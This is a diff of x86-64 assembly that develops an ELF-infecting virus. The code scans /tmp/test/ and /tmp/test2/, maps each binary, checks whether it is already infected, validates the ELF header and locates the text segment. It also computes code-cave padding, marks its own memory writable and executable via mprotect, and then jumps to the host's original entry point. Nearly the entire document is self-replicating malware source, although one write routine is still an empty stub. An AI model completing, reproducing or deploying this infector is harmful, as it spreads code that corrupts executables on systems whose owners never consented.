@@ -1,12 +1,18 @@
 				extern			sc_get_full_path
 				extern			sc_map_file
+				extern			sc_check_infection
+				extern			sc_test_elf_hdr
+				extern			sc_find_txt_seg
+				extern			sc_set_x_pad
+				extern			sc_write_mem
+
+				default			rel
 sc:
 				push			rbp
 				mov				rbp,				rsp
 
 				mov				rbx,				11 * 8 + 3 * 1024
-				sub				rsp,				rbx
-				mov				qword[sc_glob],		rsp
+				sub				rsp,				rbx					; glob @ +24
 
 				push			rdi
 				push			rsi
@@ -15,11 +21,33 @@ sc:
 				xor				rcx,				rcx
 .loop:
 				cmp				rcx,				rbx
-				je				.loop_end
+				je				.end
 
 				mov				byte[rsp+rcx],		0
+				inc				rcx
 				jmp				.loop
-.loop_end:
+.end:
+				lea				rdi,				sc_data
+				and				rdi,				0xfffffffffffff000
+
+				xor				rsi,				rsi
+				mov				rax,				qword[rsp+24+0x28]
+				mov				rbx,				1024
+				div				rbx
+
+				cmp				rdx,				0
+				je				.no_round
+				mov				rsi,				1024
+.no_round:
+				mul				rbx
+				add				rsi,				rax
+
+				mov				rdx,				7
+				mov				rax,				10
+				syscall
+
+				lea				qword[sc_glob],		[rsp+24]
+
 				lea				rdi,				[sc_dir_1]
 				call			sc_proc_dir
 
@@ -33,7 +61,7 @@ sc:
 				mov				rsp,				rbp
 				pop				rbp
 
-				jmp				qword[rel sc_old_entry]
+				jmp				qword[sc_real_entry]
 sc_proc_dir:
 				push			rbp
 				mov				rbp,				rsp
@@ -81,8 +109,6 @@ sc_proc_entries:
 				push			rdi							; +8 dir_ret
 				push			rsi							; +0 root_path
 
-				mov				qword[rsp+24],		0
-
 				mov				rdx,				qword[sc_glob]
 				add				rdx,				0x860
 				mov				qword[rsp+16],		rdx
@@ -105,28 +131,37 @@ sc_proc_entries:
 				jl				.inc
 
 				mov				rbx,				qword[sc_glob]
-				mov				rdx,				rbx
-				add				rbx,				0x48
-				add				rdx,				0xc60
-				mov				rdx,				qword[rdx]
-				mov				qword[rbx],			rdx
+				mov				rdx,				qword[rbx+0xc60]
+				mov				qword[rbx+0x48],	rdx
 
 				call			sc_check_infection
 				cmp				rax,				0
 				jl				.unmap
-
 				call			sc_test_elf_hdr
 				cmp				rax,				0
 				jl				.unmap
-
 				call			sc_find_txt_seg
 				cmp				rax,				0
 				jl				.unmap
 
+				mov				rdx,				qword[sc_glob]
+				mov				rax,				qword[rdx+0x50]	; txt
+				mov				rbx,				qword[rdx+0x58] ; nxt
+
+				mov				r8,					qword[rbx+0x8]
+				mov				r9,					qword[rbx+0x10]
+				mov				qword[rdx+0x38],	r8
+				mov				qword[rdx+0x40],	r9
+				mov				r8,					qword[rax+0x8]
+				mov				r9,					qword[rax+0x10]
+				add				r8,					qword[rax+0x20]
+				add				r9,					qword[rax+0x28]
+				sub				qword[rdx+0x38],	r8
+				sub				qword[rdx+0x40],	r9
+
 				call			sc_set_x_pad
 				cmp				rax,				0
 				jl				.unmap
-
 				call			sc_update_mem
 				cmp				rax,				0
 				jl				.unmap
@@ -146,12 +181,15 @@ sc_proc_entries:
 				xor				rbx,				rbx
 				mov				bx,					word[rdx+16]
 
-				sub				qword[rsp+8],		bx
-				add				qword[rsp+16],		bx
+				sub				qword[rsp+8],		rbx
+				add				qword[rsp+16],		rbx
 				jmp				.loop
 .end:
 				mov				rsp,				rbp
 				pop				rbp
+				ret
+sc_update_mem:
+
 				ret
 sc_end:
 
@@ -162,7 +200,7 @@ sc_dir_2:
 				db				"/tmp/test2/", 0
 sc_entry:
 				dq				sc
-sc_old_entry:
+sc_real_entry:
 				dq				sc_end
 sc_glob:
 				dq				0	; +0x18 -> sz.mem
@@ -180,6 +218,6 @@ sc_glob:
 									; +0x460 -> buffs.zeros
 									; +0x860 -> buffs.entry
 
-									; +0xc60 -> mem
+									; +0xc60 -> *mem
 									; +0xc68 -> x_pad
 sc_data_end:
